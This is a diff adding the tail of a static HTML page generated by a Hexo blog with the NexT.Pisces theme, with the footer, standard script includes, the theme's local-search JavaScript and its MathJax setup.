+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
